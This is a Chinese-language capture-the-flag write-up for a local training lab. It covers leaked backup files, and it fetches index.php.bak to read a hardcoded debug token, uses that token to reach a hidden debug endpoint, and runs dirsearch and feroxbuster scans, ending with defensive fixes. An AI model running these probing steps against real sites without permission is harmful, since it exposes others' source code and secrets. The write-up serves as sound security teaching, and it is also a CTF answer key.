# 题解：内部通知系统（备份文件泄露）

> 对应课件 p31「信息泄露」——`/index.php.bak` 那条。

## 一、题目与考点

| 项 | 值 |
|---|---|
| 考点 | 备份文件泄露、源码审计、`GET` 传参 |
| 难度 | 1 |
| 端口 | 8083 |
| Flag 格式 | `flag{...}` |

一句话：运维把源码备份留在了 Web 目录里，备份里有个硬编码的调试口令，拿它访问调试接口就有 flag。

## 二、启动环境

> ⚠️ **Windows PowerShell 5.1 用户注意**：`curl` 在那里是 `Invoke-WebRequest` 的别名，
> 敲 `curl -H "A: B"` 会报「无法绑定参数 Headers」。请改用 **`curl.exe`**（Windows 10 1803+ 自带）。
> 完整命令对照表见总 README 的「**在 Windows 上怎么敲这些命令**」一节。

```bash
cd backup-ctf
docker compose up -d --build
# 浏览器打开 http://127.0.0.1:8083/
```

## 三、手把手解题

### Step 1｜页面没有功能

首页只说「系统正在升级，功能暂不可用」，底部一行小字：「运维备注：上线时记得把调试入口关掉。」

——**「调试入口」这个词就是线索**，但入口叫什么不知道。

### Step 2｜猜备份文件

编辑器/部署时最常见的三种残留：

```
index.php.bak     ← vim/notepad 另存
index.php~        ← vim 备份
.index.php.swp    ← vim 崩溃残留
```

逐个试：

```bash
curl http://127.0.0.1:8083/index.php.bak
```

拿到源码（`.bak` 不会被 PHP 执行，是纯文本下载）：

```php
$TOKEN = 'debug-2026';          // 调试接口口令

if (isset($_GET['debug']) && $_GET['debug'] === $TOKEN) {
    echo ctf_flag();
}
```

### Step 3｜用口令访问调试接口

```bash
curl "http://127.0.0.1:8083/?debug=debug-2026"
```

页面出现「调试输出」和 Flag。

### Step 4｜机械化一点

真实环境里直接上目录扫描（这类文件在默认字典里就有）：

```bash
python dirsearch.py -u http://127.0.0.1:8083 -e bak,zip,swp,txt,old
# 或者
feroxbuster -u http://127.0.0.1:8083 -w /usr/share/wordlists/dirb/common.txt
```

## 四、为什么能成（原理）

- Web 服务器**会把 Web 根目录下所有文件当静态资源发出去**，包括 `.bak`、`.zip`、`.swp`
- 这些文件不是 PHP，所以**不会被解释执行**，而是原文下载 —— 正好等于给了你源码
- 源码里往往有：调试开关、硬编码口令、数据库账密、注释掉的老接口

本题的完整链条：**备份文件 → 源码 → 硬编码口令 → 隐藏接口 → flag**。

## 五、怎么修（防御）

- 部署时用 `rsync --exclude` / CI 构建产物，**别把 `.bak` `.swp` `.git` 带上去**
- Web 根目录用白名单：只允许 `.php`/`.html`/静态资源被访问（Nginx `location ~ \.(bak|swp|zip)$ { deny all; }`）
- 口令、密钥一律走环境变量，**不进代码、不进注释**
- 调试接口在正式环境**编译期就删掉**，别靠「记得关」

## 六、动态 Flag

`src/flag.inc.php` 优先读环境变量 `FLAG`（**明文**），未注入则自动随机生成并缓存到
`/tmp/.web_ctf_flag`。备份文件里**不含**任何 flag，只有口令。

```bash
FLAG=flag{your-dynamic-flag} docker compose up -d
```
